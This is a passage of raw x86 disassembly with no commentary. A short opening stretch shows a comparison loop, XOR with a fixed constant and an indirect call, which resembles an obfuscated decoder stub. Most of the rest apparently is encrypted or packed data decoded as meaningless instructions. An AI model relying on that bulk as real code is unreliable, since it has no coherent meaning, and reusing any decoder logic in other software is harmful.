  40d6f6:	inc    ebx
  40d6f7:	xor    edx,ecx
  40d6f9:	mov    ecx,DWORD PTR [ebp+0x8]
  40d6fc:	lea    ecx,[edx+ecx*1+0x32729d]
  40d703:	cmp    ecx,eax
  40d705:	jne    0x40d129
  40d70b:	mov    ebx,esi
  40d70d:	jmp    0x40d717
  40d712:	mov    ebx,0x32729d
  40d717:	mov    eax,DWORD PTR [ebp-0x4]
  40d71a:	xor    eax,0x7510856
  40d71f:	add    eax,ebx
  40d721:	mov    DWORD PTR [ebp-0xc],eax
  40d724:	xor    ebx,ebx
  40d726:	lea    eax,[ebp-0x10]
  40d729:	add    ebx,DWORD PTR [eax]
  40d72b:	jmp    0x40d889
  40d730:	xchg   ebp,eax
  40d731:	pop    es
  40d732:	mov    ds:0xa5aabdfe,eax
  40d737:	cmp    eax,0xb6db83b1
  40d73c:	dec    eax
  40d73d:	jmp    0x7e7e:0x8001357a
  40d744:	aas    
  40d745:	jg     0x40d7c5
  40d747:	jle    0x40d701
  40d749:	cdq    
  40d74a:	lods   al,BYTE PTR ds:[esi]
  40d74b:	mov    bh,0x6
  40d74d:	ror    DWORD PTR [eax-0x60bb4d2b],1
  40d753:	mov    ah,0xf4
  40d755:	xchg   edi,eax
  40d756:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d757:	dec    edx
  40d758:	fld    QWORD PTR ds:0x818ed094
  40d75e:	jp     0x40d721
  40d760:	push   esp
  40d761:	push   edi
  40d762:	rcr    al,cl
  40d764:	xor    ah,ch
  40d766:	add    al,0x75
  40d768:	inc    ebp
  40d769:	outs   dx,DWORD PTR ds:[esi]
  40d76a:	mov    al,0xa5
  40d76c:	xor    DWORD PTR [ebx],ebx
  40d76e:	in     al,dx
  40d76f:	sub    al,0xe3
  40d771:	popf   
  40d772:	ds push ebx
  40d774:	repz (bad) 
  40d776:	jl     0x40d785
  40d778:	and    BYTE PTR [esi],bh
  40d77a:	loopne 0x40d718
  40d77c:	jg     0x40d748
  40d77e:	test   dl,bh
  40d780:	(bad)  
  40d781:	jge    0x40d7e2
  40d783:	std    
  40d784:	fs in  eax,dx
  40d786:	dec    edi
  40d787:	cwde   
  40d788:	add    dl,bl
  40d78a:	icebp  
  40d78b:	repz mov dh,0x1f
  40d78e:	push   edi
  40d78f:	inc    ebx
  40d790:	js     0x40d7a6
  40d792:	loop   0x40d748
  40d794:	(bad)  
  40d795:	or     dh,dh
  40d797:	push   ebx
  40d798:	adc    dh,BYTE PTR [eax+0x39]
  40d79b:	ins    DWORD PTR es:[edi],dx
  40d79c:	sar    BYTE PTR [esp+edx*1-0x43018cae],cl
  40d7a3:	cmp    DWORD PTR [esp+ebx*4],0x10
  40d7a7:	outs   dx,DWORD PTR ds:[esi]
  40d7a8:	ins    BYTE PTR es:[edi],dx
  40d7a9:	xchg   DWORD PTR [eax],edi
  40d7ab:	out    0xc6,al
  40d7ad:	neg    BYTE PTR [edx-0x586b19b]
  40d7b3:	xchg   esp,eax
  40d7b4:	cwde   
  40d7b5:	faddp  st(1),st
  40d7b7:	cmp    ch,al
  40d7b9:	pop    es
  40d7ba:	out    dx,eax
  40d7bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7bc:	sub    ebx,DWORD PTR [edi-0x3a410921]
  40d7c2:	add    esi,DWORD PTR [edi-0x2ff2dbb2]
  40d7c8:	jge    0x40d833
  40d7ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7cb:	fisubr DWORD PTR [esi]
  40d7cd:	fst    DWORD PTR [edi+0x6f]
  40d7d0:	daa    
  40d7d1:	shl    BYTE PTR [edx],0x7d
  40d7d4:	popf   
  40d7d5:	mov    DWORD PTR [ecx],ebp
  40d7d7:	les    eax,FWORD PTR [ebp-0x29]
  40d7da:	add    al,0xcc
  40d7dc:	loope  0x40d7c4
  40d7de:	enter  0xb889,0xf3
  40d7e2:	sub    BYTE PTR [edi+0x40],al
  40d7e5:	pop    ds
  40d7e6:	add    ecx,DWORD PTR [eax-0x545b1f8]
  40d7ec:	mov    bl,BYTE PTR [ebp+0x26]
  40d7ef:	sub    eax,DWORD PTR [ecx]
  40d7f1:	imul   dh
  40d7f3:	lahf   
  40d7f4:	scas   eax,DWORD PTR es:[edi]
  40d7f5:	mov    al,ds:0x8bb8f1a0
  40d7fa:	cmc    
  40d7fb:	add    edx,DWORD PTR [esp+ebx*4-0x7ff6bdc1]
  40d802:	ja     0x40d79c
  40d804:	fmul   st,st(3)
  40d806:	pop    ss
  40d807:	sti    
  40d808:	loope  0x40d809
  40d80a:	adc    al,BYTE PTR [edx-0x44]
  40d80d:	addr16 aaa 
  40d80f:	call   0xc98:0x3a638b42
  40d816:	mov    edi,0x4922290e
  40d81b:	and    eax,0xc7726a1d
  40d820:	mov    al,ds:0x7cd8c43a
  40d825:	cld    
  40d826:	leave  
  40d827:	fldenv [edi-0xb]
  40d82a:	mov    ds:0x9a1e20ca,al
  40d82f:	popa   
  40d830:	mov    ch,0x15
  40d832:	mov    ds:0x86ebed5e,al
  40d837:	xchg   BYTE PTR [ebx],dl
  40d839:	jb     0x40d827
  40d83b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d83c:	push   edi
  40d83d:	cwde   
  40d83e:	fisttp DWORD PTR [edx-0x10e0e779]
  40d844:	aaa    
  40d845:	aas    
  40d846:	int    0x5e
  40d848:	bound  esp,QWORD PTR [ecx+ecx*4]
  40d84b:	add    DWORD PTR [ebp-0x1b],0x60667784
  40d852:	pop    ecx
  40d853:	sub    eax,0x62a5f018
  40d858:	rcl    al,0x6f
  40d85b:	shl    edi,cl
  40d85d:	mov    ch,0x6e
  40d85f:	sub    BYTE PTR [ebx],ah
  40d861:	and    cl,BYTE PTR [edi+0x3d]
  40d864:	aaa    
  40d865:	push   0x31
  40d867:	retf   0xf1dc
  40d86a:	mov    ds:0x535a5389,eax
  40d86f:	cmp    al,0xfe
  40d871:	adc    bh,BYTE PTR [eax+0x75]
  40d874:	pop    eax
  40d875:	xchg   DWORD PTR [ecx+0x4c],ecx
  40d878:	aam    0xe6
  40d87a:	xchg   edx,eax
  40d87b:	sti    
  40d87c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d87d:	loope  0x40d83b
  40d87f:	shl    BYTE PTR [ebp-0x18],1
  40d882:	and    cl,0xdb
  40d885:	std    
  40d886:	leave  
  40d887:	sahf   
  40d888:	xlat   BYTE PTR ds:[ebx]
  40d889:	call   ebx
  40d88b:	xor    ebx,ebx
  40d88d:	jmp    0x40d9eb
  40d892:	mul    BYTE PTR [ebx-0x6c]
  40d895:	jne    0x40d914
  40d897:	lds    edx,FWORD PTR [edi+0x51026b7d]
  40d89d:	mov    esi,DWORD PTR [ecx-0x3de0adac]
  40d8a3:	cmp    DWORD PTR [esi+0x7e],0x7e7e7f3f
  40d8aa:	mov    ebp,0x71e5975d
  40d8af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8b0:	repnz pop ds
  40d8b2:	lods   eax,DWORD PTR ds:[esi]
  40d8b3:	test   eax,0xe9cc4def
  40d8b8:	es stos DWORD PTR es:[edi],eax
  40d8ba:	cdq    
  40d8bb:	aad    0x1a
  40d8bd:	or     eax,0xef5d79f9
  40d8c2:	cmp    al,0xbd
  40d8c4:	or     dh,BYTE PTR [edx+0x646a53b5]
  40d8ca:	gs jo  0x40d85a
  40d8cd:	pop    ebx
  40d8ce:	add    ecx,DWORD PTR [eax-0x52d9a0af]
  40d8d4:	inc    eax
  40d8d5:	je     0x40d8a9
  40d8d7:	xchg   DWORD PTR [eax+edx*1-0x2df6c1ea],ebx
  40d8de:	scas   al,BYTE PTR es:[edi]
  40d8df:	xchg   ecx,eax
  40d8e0:	cmp    eax,0x3510a553
  40d8e5:	icebp  
  40d8e6:	ret    
  40d8e7:	fnstenv [edi-0x5de9b2e3]
  40d8ed:	mov    bl,0xe1
  40d8ef:	ret    
  40d8f0:	xlat   BYTE PTR ds:[ebx]
  40d8f1:	jge    0x40d90b
  40d8f3:	sub    eax,0xb5a78114
  40d8f8:	mov    bl,BYTE PTR [ebx]
  40d8fa:	or     dh,BYTE PTR [edx]
  40d8fc:	ficomp DWORD PTR [ebp-0x55]
  40d8ff:	jno    0x40d88a
  40d901:	ret    0xae5b
  40d904:	(bad)  
  40d906:	mov    al,ds:0x38d4d31b
  40d90b:	inc    eax
  40d90c:	xchg   ebx,eax
  40d90d:	fs inc ebp
  40d90f:	imul   ebx,DWORD PTR [esi-0x36],0xffffffe3
  40d913:	dec    esi
  40d914:	bound  esi,QWORD PTR [esi-0x72fb0e2a]
  40d91a:	mov    BYTE PTR [ebp-0x89354ed],ch
  40d920:	or     ah,BYTE PTR [ebp-0x6]
  40d923:	pop    ds
  40d924:	add    al,0x97
  40d926:	xor    al,0xe4
  40d928:	xchg   edi,eax
  40d929:	cld    
  40d92a:	mov    ah,0xef
  40d92c:	mov    al,0x2
  40d92e:	test   eax,0x79a2909c
  40d933:	psadbw mm3,QWORD PTR [esi+ebp*2-0x440b024e]
  40d93b:	in     eax,dx
  40d93c:	mov    esi,0x91248749
  40d941:	(bad)  
  40d942:	vpperm ymm10,ymm3,YMMWORD PTR [edi+0x57a531a8],ymm5
  40d94c:	mov    ch,0xff
  40d94e:	scas   al,BYTE PTR es:[edi]
  40d94f:	fldcw  WORD PTR [esi+0x32]
  40d952:	and    ebp,0xffffff94
  40d955:	mov    edx,esi
  40d957:	inc    ebp
  40d958:	retf   
  40d959:	adc    eax,0xbd01d09
  40d95e:	repz fdiv QWORD PTR [esi-0x15399adc]
  40d965:	iret   
  40d966:	add    eax,0x2ae380f1
  40d96b:	push   ecx
  40d96c:	dec    ecx
  40d96d:	ror    dh,0xc3
  40d970:	xlat   BYTE PTR ds:[ebx]
  40d971:	addr16 call 0x503cc958
  40d977:	cwd    
  40d979:	lea    esi,[edi-0x53]
  40d97c:	push   ds
  40d97d:	inc    edi
  40d97e:	cmp    DWORD PTR [edi+0x330d394e],ebp
  40d984:	repnz push es
  40d986:	in     eax,0xd6
  40d988:	int    0x63
  40d98a:	jle    0x40d9bf
  40d98c:	dec    edi
  40d98d:	mov    edx,0x900c89b4
  40d992:	xor    edi,DWORD PTR [ebp-0x5617d844]
  40d998:	in     al,dx
  40d999:	pop    ebx
  40d99a:	sub    bh,BYTE PTR [edx+edx*1]
  40d99d:	fnstenv [ecx+0x39b9592b]
  40d9a3:	or     eax,0xe869b088
  40d9a8:	daa    
  40d9a9:	(bad)  
  40d9aa:	xchg   DWORD PTR [ebx],edx
  40d9ac:	xchg   edi,eax
  40d9ad:	data16 jge 0x40da2d
  40d9b0:	pop    ebp
  40d9b1:	xchg   DWORD PTR [eax-0x6c],edi
  40d9b4:	push   esp
  40d9b5:	test   eax,0x41f1e7d4
  40d9ba:	mov    eax,ds:0x176be066
  40d9bf:	mov    edi,0x96e464ff
  40d9c4:	repnz jmp 0x58d1:0xcf2b1c5a
  40d9cc:	mov    al,ds:0x9160cae1
  40d9d1:	out    dx,al
  40d9d2:	pop    esi
  40d9d3:	rcl    BYTE PTR [ebp-0x17a351a3],1
  40d9d9:	jecxz  0x40da02
  40d9db:	and    BYTE PTR [esi-0x3f],al
  40d9de:	xchg   ebx,eax
  40d9df:	mov    ebp,0xd7161694
  40d9e4:	add    eax,0xea16b8ac
  40d9e9:	fwait
  40d9ea:	into   
  40d9eb:	inc    ebx
  40d9ec:	jmp    0x40db4a
  40d9f1:	jae    0x40d9e7
  40d9f3:	aas    
  40d9f4:	mov    DWORD PTR [ecx-0x6573b2b3],esi
  40d9fa:	cmp    BYTE PTR [edx+0x77],bl
  40d9fd:	sub    eax,0x8368d45d
  40da02:	cmp    BYTE PTR [esi+0x7e],0x3f
  40da06:	jg     0x40da86
  40da08:	jle    0x40d98f
  40da0a:	mov    edx,0xc7008b9b
  40da0f:	das    
  40da10:	loop   0x40d9fb
  40da12:	pop    esi
  40da13:	into   
  40da14:	mov    ch,0x26
  40da16:	in     eax,dx
  40da17:	(bad)  
  40da18:	arpl   bx,si
  40da1a:	mov    cl,dh
  40da1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da1d:	test   al,0x59
  40da1f:	into   
  40da20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da21:	mov    eax,0x11b929f6
  40da26:	sbb    dh,BYTE PTR [esi-0x6238badd]
  40da2c:	adc    bl,BYTE PTR [ebx]
  40da2e:	dec    ebp
  40da2f:	cdq    
  40da30:	jbe    0x40da97
  40da32:	xchg   ebp,eax
  40da33:	(bad)  
  40da35:	sar    BYTE PTR [ebx+0x24],cl
  40da38:	ja     0x40da50
  40da3a:	xor    cl,BYTE PTR [eax-0x6a]
  40da3d:	popa   
  40da3e:	push   es
  40da3f:	mov    eax,0x65b8656c
  40da44:	jbe    0x40da03
  40da46:	aad    0x67
  40da48:	sar    bh,cl
  40da4a:	or     BYTE PTR [edx+eax*8+0x76],0xf3
  40da4f:	fidiv  WORD PTR [edx+0x6dbd751d]
  40da55:	sbb    eax,DWORD PTR [eax+0x7f]
  40da58:	adc    eax,0xb2b9dcc4
  40da5d:	out    dx,eax
  40da5e:	or     al,ah
  40da60:	enter  0xa3b5,0x22
  40da64:	(bad)  
  40da65:	sahf   
  40da66:	jl     0x40da12
  40da68:	cmp    eax,0xa18fa7d2
  40da6d:	aam    0x97
  40da6f:	js     0x40d9f3
  40da71:	xor    BYTE PTR [ebx],bh
  40da73:	js     0x40dad3
  40da75:	sahf   
  40da76:	mov    eax,ds:0x8394e23b
  40da7b:	and    BYTE PTR [esi-0x584a236d],ah
  40da81:	arpl   WORD PTR [edi-0x51],bx
  40da84:	(bad)  
  40da85:	cmp    al,0x8d
  40da87:	(bad)  
  40da88:	push   ss
  40da89:	jmp    0xd8ef:0xed0fb04b
  40da90:	pop    ebx
  40da91:	dec    esp
  40da92:	mov    dh,0xc6
  40da94:	cmp    al,0xb4
  40da96:	fsub   DWORD PTR [edi-0x20]
  40da99:	push   ss
  40da9a:	stos   BYTE PTR es:[edi],al
  40da9b:	adc    BYTE PTR [esi+0x7f],0x6d
  40da9f:	pop    eax
  40daa0:	popf   
  40daa1:	inc    ebp
  40daa2:	ja     0x40db0d
  40daa4:	outs   dx,DWORD PTR ds:[esi]
  40daa5:	outs   dx,BYTE PTR ds:[esi]
  40daa6:	out    0x8,al
  40daa8:	mov    bh,0x1a
  40daaa:	nop
  40daab:	lahf   
  40daac:	stc    
  40daad:	sar    BYTE PTR [ebx+0x2cbebc60],0x84
  40dab4:	push   ebp
  40dab5:	push   ds
  40dab6:	(bad)  
  40dab7:	mov    edi,ebx
  40dab9:	add    ch,BYTE PTR [ebp-0x31]
  40dabc:	sbb    ebp,DWORD PTR [eax]
  40dabe:	add    ah,BYTE PTR [esi-0x5d]
  40dac1:	aad    0xec
  40dac3:	hlt    
  40dac4:	pop    eax
  40dac5:	dec    esp
  40dac6:	lea    esp,[eax-0x2f4fc86]
  40dacc:	inc    eax
  40dacd:	jne    0x40db1f
  40dacf:	jb     0x40db35
  40dad1:	or     ebp,ecx
  40dad3:	sar    ch,cl
  40dad5:	in     al,0xf4
  40dad7:	sbb    eax,0xa7c7f5b0
  40dadc:	lock push 0xd658291c
  40dae2:	(bad)  
  40dae3:	mov    cr4,ebx
  40dae6:	mov    dh,BYTE PTR [edi]
  40dae8:	sbb    edi,DWORD PTR [eax]
  40daea:	lods   eax,DWORD PTR ds:[esi]
  40daeb:	mov    esp,0xcd38e434
  40daf0:	fisttp DWORD PTR [ecx-0x2f]
  40daf3:	cdq    
  40daf4:	iret   
  40daf5:	call   0x9480:0x17ca2a34
  40dafc:	inc    ecx
  40dafd:	cld    
  40dafe:	aaa    
  40daff:	imul   ecx,DWORD PTR [esi],0xb
  40db02:	push   edi
  40db03:	push   0xa184fb76
  40db08:	imul   ebx,DWORD PTR [ebx],0xffffff9f
  40db0b:	loopne 0x40db09
  40db0d:	mov    ss,WORD PTR [eax+0x7c]
  40db10:	dec    ebp
  40db11:	dec    edx
  40db12:	nop
  40db13:	inc    ebp
  40db14:	mov    esp,ecx
  40db16:	xor    ecx,esp
  40db18:	jmp    0x27a0:0xe6eb930d
  40db1f:	retf   
  40db20:	mov    DWORD PTR [ecx+ecx*8],ebp
  40db23:	mov    edi,0x7a6c005
  40db28:	arpl   di,cx
  40db2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db2b:	sub    al,0x11
  40db2d:	pop    esi
  40db2e:	mov    cl,BYTE PTR [eax-0x40]
  40db31:	cmp    al,0x35
  40db33:	xor    DWORD PTR [edx+ecx*2+0x329091bf],eax
  40db3a:	xlat   BYTE PTR ds:[ebx]
  40db3b:	clc    
  40db3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db3d:	jno    0x40dacd
  40db3f:	adc    ch,BYTE PTR [ebx-0x25]
  40db42:	dec    ebp
  40db43:	mov    ds:0x3eff92a0,eax
  40db48:	outs   dx,DWORD PTR ds:[esi]
  40db49:	int    0x39
  40db4b:	pop    ebp
  40db4c:	adc    BYTE PTR [edi],cl
  40db4e:	test   BYTE PTR [edx],dh
  40db50:	add    al,0x0
  40db52:	add    cl,ch
  40db54:	pop    ecx
  40db55:	add    DWORD PTR [eax],eax
  40db57:	add    BYTE PTR [ebp-0x54e36178],dl
  40db5d:	cmp    al,0xbd
  40db5f:	mov    ecx,0xd105ab5
  40db64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db65:	out    dx,eax
  40db66:	jle    0x40db21
  40db68:	inc    esp
  40db69:	cmp    DWORD PTR [esi+0x7e],0x3f
  40db6d:	jg     0x40dbed
  40db6f:	jle    0x40dba0
  40db71:	ret    
  40db72:	je     0x40db52
  40db74:	add    BYTE PTR [edi],bl
  40db76:	sbb    DWORD PTR [esi],edi
  40db78:	xor    al,0x25
  40db7a:	add    BYTE PTR [ebx+eiz*2],dl
  40db7d:	sub    al,0xc6
  40db7f:	sbb    dl,BYTE PTR [ebx+0x53]
  40db82:	cmp    al,0xaf
  40db84:	pop    ebx
  40db85:	inc    esp
  40db86:	adc    eax,0x4e0ed715
  40db8b:	sub    eax,0x107b2542
  40db90:	sbb    BYTE PTR [ebx],bh
  40db92:	stc    
  40db93:	xchg   esi,eax
  40db94:	inc    eax
  40db95:	jnp    0x40db89
  40db97:	mov    ebp,0xc5b3f292
  40db9c:	ja     0x40dbf3
  40db9e:	imul   ecx,DWORD PTR es:[ecx-0x2997ed23],0xa629e41d
  40dba9:	iret   
  40dbaa:	addr16 or eax,0xf9718dda
  40dbb0:	sbb    al,0x5c
  40dbb2:	and    BYTE PTR [ebp-0x2f],ch
  40dbb5:	pop    ss
  40dbb6:	fcomp  QWORD PTR [edi]
  40dbb8:	out    dx,eax
  40dbb9:	test   al,0xe8
  40dbbb:	scas   al,BYTE PTR es:[edi]
  40dbbc:	es enter 0xb60b,0xd0
  40dbc1:	pop    ebp
  40dbc2:	in     al,dx
  40dbc3:	inc    ebx
  40dbc4:	mov    bl,0x63
  40dbc6:	imul   edx,DWORD PTR [edi-0x12],0x1c3516c
  40dbcd:	xchg   BYTE PTR [edx+0x19],ch
  40dbd0:	xor    al,0x44
  40dbd2:	sbb    al,0x4d
  40dbd4:	pop    ds
  40dbd5:	ficom  DWORD PTR [ebx+0x17]
  40dbd8:	mov    ebp,DWORD PTR [si+0x6a99]
  40dbdd:	lea    edi,[ebx-0x9]
  40dbe0:	cmp    al,BYTE PTR [eax]
  40dbe2:	test   BYTE PTR [edi],ch
  40dbe4:	jo     0x40dc07
  40dbe6:	cmp    dh,BYTE PTR [esi+0xf190523]
  40dbec:	imul   esp,DWORD PTR [ebx-0x4705c5b4],0x497aab9f
  40dbf6:	loop   0x40dc42
  40dbf8:	sbb    eax,0xc71327a0
  40dbfd:	sahf   
  40dbfe:	lods   al,BYTE PTR ds:[esi]
  40dbff:	das    
  40dc00:	repnz (bad) 
  40dc02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc03:	push   ebx
  40dc04:	leave  
  40dc05:	shl    DWORD PTR ds:0x71a042db,1
  40dc0b:	out    0xf8,eax
  40dc0d:	jle    0x40dc64
  40dc0f:	sti    
  40dc10:	enter  0x9c59,0xd7
  40dc14:	stos   BYTE PTR es:[edi],al
  40dc15:	in     al,dx
  40dc16:	or     ebp,ecx
  40dc18:	and    ebx,DWORD PTR [ecx+0x53]
  40dc1b:	add    bl,dh
  40dc1d:	stos   DWORD PTR es:[edi],eax
  40dc1e:	jne    0x40dc2b
  40dc20:	popf   
  40dc21:	pushf  
  40dc22:	sub    esp,eax
  40dc24:	arpl   WORD PTR [ebx-0x78],si
  40dc27:	(bad)  
  40dc28:	jbe    0x40dbd8
  40dc2a:	gs int 0x62
  40dc2d:	sub    DWORD PTR [eiz*8-0xa88fc5b],0x4bde3ba3
  40dc38:	xor    BYTE PTR [ebp+0x19c8294e],bh
  40dc3e:	add    DWORD PTR [ebx+ebp*2-0x63],esp
  40dc42:	ficom  WORD PTR [ebx+ebx*2]
  40dc45:	into   
  40dc46:	push   0x5ee0b4c4
  40dc4b:	int3   
  40dc4c:	fs xchg cl,al
  40dc4f:	pop    edx
  40dc50:	ret    
  40dc51:	push   ebp
  40dc52:	adc    BYTE PTR [eax+0x3],ch
  40dc55:	jecxz  0x40dcb0
  40dc57:	scas   eax,DWORD PTR es:[edi]
  40dc58:	mov    WORD PTR [ebx+esi*4+0x1b62e6cc],es
  40dc5f:	sub    eax,0x30762c7a
  40dc64:	ror    DWORD PTR [edi-0x5a],0x3d
  40dc68:	in     eax,0xc2
  40dc6a:	jbe    0x40dca6
  40dc6c:	dec    eax
  40dc6d:	push   edx
  40dc6f:	loop   0x40dc7a
  40dc71:	cmp    DWORD PTR [edx-0x1f],esp
  40dc74:	pop    esp
  40dc75:	aam    0x90
  40dc77:	pop    eax
  40dc78:	leave  
  40dc79:	mov    ds:0xcb462a4f,al
  40dc7e:	adc    BYTE PTR [ecx+0x3eb71cd6],bl
  40dc84:	and    eax,0xad5a1b0b
  40dc89:	repnz push cs
  40dc8b:	xchg   esi,eax
  40dc8c:	sahf   
  40dc8d:	push   cs
  40dc8e:	sahf   
  40dc8f:	dec    ebx
  40dc90:	ins    DWORD PTR es:[edi],dx
  40dc91:	and    ebp,DWORD PTR [ecx+ecx*2+0x78bc1c4b]
  40dc98:	in     eax,dx
  40dc99:	rcl    BYTE PTR [ebp+0x3db15fd0],cl
  40dc9f:	mov    cl,0x4a
  40dca1:	or     BYTE PTR [edi],bh
  40dca3:	cmp    cx,bx
  40dca6:	mov    ds:0xd0f63fa4,eax
  40dcab:	xchg   DWORD PTR [eax-0x74],eax
  40dcae:	cmp    DWORD PTR [eax],0x59e99223
  40dcb4:	add    DWORD PTR [eax],eax
  40dcb6:	add    BYTE PTR [eax+0x15],cl
  40dcb9:	sti    
  40dcba:	retf   0xdc7b
  40dcbd:	jns    0x40dc54
  40dcbf:	rcl    BYTE PTR ds:0x5a803fe9,cl
  40dcc5:	hlt    
  40dcc6:	daa    
  40dcc7:	add    eax,0x3f7e7e85
  40dccc:	jg     0x40dd4c
  40dcce:	jle    0x40dca7
  40dcd0:	push   eax
  40dcd1:	jmp    0x5fbe:0xb562f13c
  40dcd8:	cmp    eax,0x1b74feab
  40dcdd:	xchg   esi,eax
  40dcde:	xchg   edi,eax
  40dcdf:	pop    ebx
  40dce0:	jl     0x40dc7f
  40dce2:	sbb    DWORD PTR [ebp-0x49],esi
  40dce5:	mov    ss,WORD PTR [edi+0x46]
  40dce8:	outs   dx,DWORD PTR ds:[esi]
  40dce9:	out    0x50,eax
  40dceb:	imul   edx,DWORD PTR [esi+0x26c33193],0x7c
  40dcf2:	add    DWORD PTR [ebp+0x22c16e95],ebp
  40dcf8:	dec    DWORD PTR [ebx]
  40dcfa:	aas    
  40dcfb:	popf   
  40dcfc:	xor    DWORD PTR [eax],ebx
  40dcfe:	sbb    ecx,ebp
  40dd00:	pop    es
  40dd01:	inc    edi
  40dd02:	sbb    eax,0x3ff54c3
  40dd07:	cmp    al,0xad
  40dd09:	(bad)  [esi]
  40dd0b:	(bad)  
  40dd0c:	into   
  40dd0d:	test   eax,0x6a81a24f
  40dd12:	data16 js 0x40dccb
  40dd15:	ret    
  40dd16:	xor    BYTE PTR [edx+0x9],bl
  40dd19:	mov    ebp,0xb5a866
  40dd1e:	xchg   ebp,eax
  40dd1f:	fisttp WORD PTR [eax]
  40dd21:	push   edi
  40dd22:	xlat   BYTE PTR ds:[ebx]
  40dd23:	stos   DWORD PTR es:[edi],eax
  40dd24:	mov    eax,ds:0xd58300f3
  40dd29:	rcr    BYTE PTR [eax],0x78
  40dd2c:	sar    BYTE PTR [esi],0xbb
  40dd2f:	adc    eax,0x9b171d81
  40dd34:	mov    WORD PTR [ebx-0xc3deab8],gs
  40dd3a:	in     eax,dx
  40dd3b:	push   esi
  40dd3c:	xor    esp,esp
  40dd3e:	xchg   esp,eax
  40dd3f:	pop    edi
  40dd40:	clc    
  40dd41:	hlt    
  40dd42:	dec    ebp
  40dd43:	mov    ebp,0xa676d7f0
  40dd48:	and    BYTE PTR fs:[ecx],bl
  40dd4b:	in     al,0xdf
  40dd4d:	dec    ecx
  40dd4e:	test   BYTE PTR [ecx+eax*1-0x13bb0336],cl
  40dd55:	imul   ecx,ebp,0x88f7bd95
  40dd5b:	add    al,0x60
  40dd5d:	and    al,0xc9
  40dd5f:	retf   
  40dd60:	fadd   QWORD PTR [edi+0x1f]
  40dd63:	outs   dx,DWORD PTR ds:[esi]
  40dd64:	fcomp  DWORD PTR [esi-0x22]
  40dd67:	(bad)  
  40dd68:	(bad)  
  40dd69:	pop    esp
  40dd6a:	xor    al,ch
  40dd6c:	jns    0x40dd95
  40dd6e:	ds sahf 
  40dd70:	imul   ecx,DWORD PTR [ebp+0x58],0x1e
  40dd74:	fs pop ebp
  40dd76:	cmp    bl,BYTE PTR [ebx]
  40dd78:	inc    eax
  40dd79:	enter  0xbb3,0x61
  40dd7d:	arpl   WORD PTR [edx-0x5d],si
  40dd80:	imul   ebp,DWORD PTR [ebx],0xffffff9e
  40dd83:	jne    0x40dda0
  40dd85:	test   BYTE PTR [esi-0x23],al
  40dd88:	inc    eax
  40dd89:	inc    esi
  40dd8a:	mov    ds:0x5dd2362a,al
  40dd8f:	loope  0x40dd14
  40dd91:	test   dl,cl
  40dd93:	sub    al,0x16
  40dd95:	or     eax,0x6fbeb445
  40dd9a:	inc    esp
  40dd9b:	sbb    ah,0x51
  40dd9e:	sub    DWORD PTR [esi-0x20d078b],0xbeaf1139
  40dda8:	sbb    eax,0x28c281f3
  40ddad:	sub    DWORD PTR [esp+eax*8+0x58],ebp
  40ddb1:	test   ebx,eax
  40ddb3:	sub    ah,cl
  40ddb5:	shr    DWORD PTR [ecx],0xc5
  40ddb8:	pop    ebx
  40ddb9:	aas    
  40ddba:	test   DWORD PTR [ebx+eiz*1+0x198cedc7],edi
  40ddc1:	sub    dh,BYTE PTR [ecx-0x1]
  40ddc4:	mov    ds:0x5eb32b1a,eax
  40ddc9:	repz xor BYTE PTR [ebx+0x1529bebb],0xeb
  40ddd1:	test   DWORD PTR [edx-0x4a],ebp
  40ddd4:	enter  0xbbc9,0x38
  40ddd8:	repnz rcr DWORD PTR [edi],1
  40dddb:	in     al,0x47
  40dddd:	xchg   edi,eax
  40ddde:	aaa    
  40dddf:	mov    cl,0x6b
  40dde1:	int    0x8c
  40dde3:	or     esi,DWORD PTR [ecx-0x19624ff7]
  40dde9:	pop    ds
  40ddea:	xchg   ebx,eax
  40ddeb:	pop    esi
  40ddec:	mov    ecx,0x4566623c
  40ddf1:	iret   
  40ddf2:	pop    eax
  40ddf3:	cmp    esi,0x97a6c0da
  40ddf9:	dec    ecx
  40ddfa:	sbb    dl,BYTE PTR [edx-0x58318784]
  40de00:	(bad)
  40de03:	sbb    eax,0x214cf69a
  40de08:	cmp    esi,DWORD PTR ds:0x6893f2dc
  40de0e:	(bad)  
  40de10:	push   0xa
  40de12:	pop    ecx
  40de13:	push   0x4
  40de15:	pop    ebx
  40de16:	inc    ebx
  40de17:	xchg   ebx,ecx
  40de19:	jmp    0x40df77
  40de1e:	ss test al,0xe0
  40de21:	or     eax,0x6dfb5d60
  40de26:	mov    al,0x7d
  40de28:	jmp    0xef6f068d
  40de2d:	cmp    eax,esi
  40de2f:	xchg   BYTE PTR [esi+0x7e],bh
  40de32:	aas    
  40de33:	jg     0x40deb3
  40de35:	jle    0x40de80
  40de37:	fst    DWORD PTR [esi]
  40de39:	mov    edx,0x1442fc17
  40de3e:	mov    cl,0xf6
  40de40:	loopne 0x40ddf0
  40de42:	and    BYTE PTR [esi+eax*1-0x5249124f],bl
  40de49:	imul   esi,DWORD PTR [ebx],0xffffffaf
  40de4c:	(bad)  
  40de4d:	cdq    
  40de4e:	sub    ch,BYTE PTR ds:0xd038f1ef
  40de54:	pop    ss
  40de55:	dec    eax
  40de56:	sub    DWORD PTR [edi-0x79361fde],esi
  40de5c:	or     eax,0x2767539
  40de61:	not    DWORD PTR [ebp+0x4899bceb]
  40de67:	hlt    
  40de68:	pop    es
  40de69:	push   edi
  40de6a:	or     al,0x44
  40de6c:	xchg   esp,eax
  40de6d:	cld    
  40de6e:	jae    0x40de2d
  40de70:	or     al,0xc3
  40de72:	push   ebx
  40de73:	jmp    DWORD PTR [eax+0x78]
  40de76:	add    ch,BYTE PTR [ecx+0xa73baf8]
  40de7c:	or     ebp,0xa52d948d
  40de82:	pop    eax
  40de83:	mov    bl,0x3d
  40de85:	push   0xffffff95
  40de87:	icebp  
  40de88:	xor    ebp,DWORD PTR [ebp-0x4f]
